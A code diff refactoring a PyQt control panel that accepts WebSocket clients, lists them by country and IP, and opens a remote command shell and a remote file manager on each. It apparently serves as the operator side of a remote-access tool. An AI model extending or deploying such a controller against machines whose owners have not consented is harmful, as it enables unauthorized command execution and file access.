@@ -636,33 +599,16 @@ class MainWindow(QMainWindow):
                 QMainWindow { background-color: #1e1e1e; }
                 QWidget { background-color: #1e1e1e; }
                 QLabel { color: #d4d4d4; }
-                QLineEdit {
-                    background-color: #2d2d2d;
-                    color: #d4d4d4;
-                    border: 1px solid #3d3d3d;
-                    padding: 4px;
-                }
-                QPushButton {
-                    background-color: #3d3d3d;
-                    color: #d4d4d4;
-                    border: 1px solid #4d4d4d;
-                    padding: 5px 15px;
-                }
+                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; padding: 4px; }
+                QPushButton { background-color: #3d3d3d; color: #d4d4d4; border: 1px solid #4d4d4d; padding: 5px 15px; }
                 QPushButton:hover { background-color: #4d4d4d; }
                 QPushButton:disabled { color: #666; background-color: #2d2d2d; }
-                QListView {
-                    background-color: #2d2d2d;
-                    color: #d4d4d4;
-                    border: 1px solid #3d3d3d;
-                }
+                QListView { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                 QListView::item:selected { background-color: #3d7a9e; }
-                QTextEdit {
-                    background-color: #2d2d2d;
-                    color: #d4d4d4;
-                    border: 1px solid #3d3d3d;
-                }
+                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                 QMenu { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                 QMenu::item:selected { background-color: #3d7a9e; }
+                QTreeWidget { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
             """)
             self.btn_theme.setText("☀️ 日间模式")
         else:
@@ -677,10 +623,7 @@ class MainWindow(QMainWindow):
         self.apply_theme(not self.is_dark_mode)
 
     def log(self, msg):
-        now = datetime.now().strftime('%H:%M:%S')
-        line = f"[{now}] {msg}"
-        self.log_box.append(line)
-        print(line)
+        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
 
     @pyqtSlot()
     def broadcast_ping(self):
@@ -692,84 +635,60 @@ class MainWindow(QMainWindow):
         while self.server_running:
             try:
                 raw_conn, addr = self.server_sock.accept()
-                try:
-                    ok_handshake, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
-                except Exception as e:
-                    self.log(f"握手解析异常 {addr} , err:{str(e)}")
-                    raw_conn.close()
-                    continue
-                if not ok_handshake:
+                ok, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
+                if not ok:
                     self.log(f"WebSocket握手失败 {addr}")
-                    raw_conn.close()
-                    continue
-                if not ip:
-                    ip = addr[0]
-                if not country:
-                    country = "XX"
-                if not display_name:
-                    display_name = f"[{country}] {ip}"
+                    raw_conn.close(); continue
+                if not ip: ip = addr[0]
+                if not country: country = "XX"
+                if not display_name: display_name = f"[{country}] {ip}"
                 sess = ClientSession(raw_conn, ip, country, display_name)
                 sess.signals.on_outp.connect(self.handle_session_outp)
-                sess.signals.on_vfs_reply.connect(self.handle_vfs_reply)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
                 self.log(f"[新接入] {display_name}")
-                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
-                t.start()
+                threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
             except OSError:
                 break
-            except Exception as e:
-                self.log(f"accept loop 未知异常:{str(e)}")
 
     @pyqtSlot(object, str)
-    def handle_session_outp(self, sess: ClientSession, text: str):
+    def handle_session_outp(self, sess, text):
         if sess in self.open_cmd_dialogs:
-            dlg = self.open_cmd_dialogs[sess]
-            dlg.append_text(text)
-
-    @pyqtSlot(object, bytes)
-    def handle_vfs_reply(self, sess: ClientSession, payload: bytes):
-        if sess in self.open_file_dialogs:
-            dlg = self.open_file_dialogs[sess]
-            dlg.on_vfs_response(sess, payload)
+            self.open_cmd_dialogs[sess].append_text(text)
 
     @pyqtSlot(object)
-    def handle_session_disconnect(self, sess: ClientSession):
+    def handle_session_disconnect(self, sess):
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
             dlg.append_text("\n[!] WebSocket连接已经断开")
         if sess in self.open_file_dialogs:
             dlg = self.open_file_dialogs.pop(sess)
-            dlg.is_alive = False
+            dlg.close()
         self.client_model.remove_by_obj(sess)
         self.log(f"[断开] {sess.display_name}")
 
-    def client_recv_loop(self, sess: ClientSession):
+    def client_recv_loop(self, sess):
         buf = sess._recv_buf
-        try:
-            while sess.connected:
+        while sess.connected:
+            try:
                 chunk = sess.conn.recv(4096)
-                if not chunk:
-                    break
+                if not chunk: break
                 buf.extend(chunk)
                 while True:
-                    ret = ws_parse_frame(buf)
-                    fin, opcode, payload, consumed = ret
-                    if consumed <= 0:
-                        break
+                    fin, opcode, payload, consumed = ws_parse_frame(buf)
+                    if consumed <= 0: break
                     del buf[:consumed]
+
                     if opcode == WS_OP_PING:
-                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
+                        pong = ws_build_server_frame(True, WS_OP_PONG, payload)
                         with sess._send_lock:
-                            sess.conn.sendall(pong_frame)
+                            sess.conn.sendall(pong)
                         continue
                     elif opcode == WS_OP_PONG:
                         continue
                     elif opcode == WS_OP_CLOSE:
                         break
                     elif opcode == WS_OP_TEXT:
-                        text_msg = payload.decode("utf-8", errors="replace")
-                        self.log(f"[TEXT] {sess.display_name}: {text_msg}")
                         continue
                     elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                         if opcode == WS_OP_BINARY:
@@ -785,21 +704,19 @@ class MainWindow(QMainWindow):
                                     body = full_body[4:4+body_len]
                                     if len(body) >= 4:
                                         cmd_code = body[0:4]
-                                        print(f"[RECV PKT] {sess.display_name} cmd={cmd_code.decode('ascii','replace')} body_len={len(body)}")
                                         if cmd_code == b"PONG":
                                             sess.last_pong = datetime.now()
                                             self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                                         elif cmd_code == b"OUTP":
-                                            output_bytes = body[4:]
-                                            out_text = output_bytes.decode("gbk", errors="replace")
+                                            out_text = body[4:].decode("gbk", errors="replace")
                                             sess.signals.on_outp.emit(sess, out_text)
-                                        else:
-                                            sess.signals.on_vfs_reply.emit(sess, body)
-        except Exception as e:
-            self.log(f"[会话异常] {sess.display_name} error:{str(e)}")
-        finally:
-            sess.close()
-            sess.signals.on_disconnect.emit(sess)
+                                        elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
+                                                          b"FACK", b"FOK", b"FERR"):
+                                            sess.signals.on_fs.emit(sess, body)
+            except (OSError, ConnectionResetError):
+                break
+        sess.close()
+        sess.signals.on_disconnect.emit(sess)
 
     def start_server(self):
         port = int(self.port_edit.text())
@@ -818,10 +735,8 @@ class MainWindow(QMainWindow):
         self.ping_timer.stop()
         self.server_running = False
         if self.server_sock:
-            try:
-                self.server_sock.close()
-            except Exception:
-                pass
+            try: self.server_sock.close()
+            except Exception: pass
         for s in self.client_model.items:
             s.close()
         self.open_cmd_dialogs.clear()
@@ -832,36 +747,31 @@ class MainWindow(QMainWindow):
 
     def on_context_menu(self, pos):
         idx = self.view.indexAt(pos)
-        if not idx.isValid():
-            return
-        sess: ClientSession = self.client_model.items[idx.row()]
+        if not idx.isValid(): return
+        sess = self.client_model.items[idx.row()]
         menu = QMenu()
-        act_open_cmd = menu.addAction("打开远程CMD会话")
-        act_open_file = menu.addAction("打开远程磁盘文件管理器")
+        act_cmd = menu.addAction("打开远程CMD会话")
+        act_file = menu.addAction("打开文件管理")
         ret = menu.exec(self.view.viewport().mapToGlobal(pos))
-        if ret == act_open_cmd:
+        if ret == act_cmd:
             if sess in self.open_cmd_dialogs:
                 dlg = self.open_cmd_dialogs[sess]
                 if dlg.isVisible():
-                    dlg.raise_()
-                    dlg.activateWindow()
-                    return
+                    dlg.raise_(); dlg.activateWindow(); return
                 else:
                     del self.open_cmd_dialogs[sess]
             dlg = RemoteCmdDialog(sess, parent=self)
             dlg.apply_theme(self.is_dark_mode)
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
-        elif ret == act_open_file:
+        elif ret == act_file:
             if sess in self.open_file_dialogs:
                 dlg = self.open_file_dialogs[sess]
                 if dlg.isVisible():
-                    dlg.raise_()
-                    dlg.activateWindow()
-                    return
+                    dlg.raise_(); dlg.activateWindow(); return
                 else:
                     del self.open_file_dialogs[sess]
-            dlg = RemoteFileDialog(sess, parent=self)
+            dlg = FileManagerDialog(sess, parent=self)
             dlg.apply_theme(self.is_dark_mode)
             self.open_file_dialogs[sess] = dlg
             dlg.show()
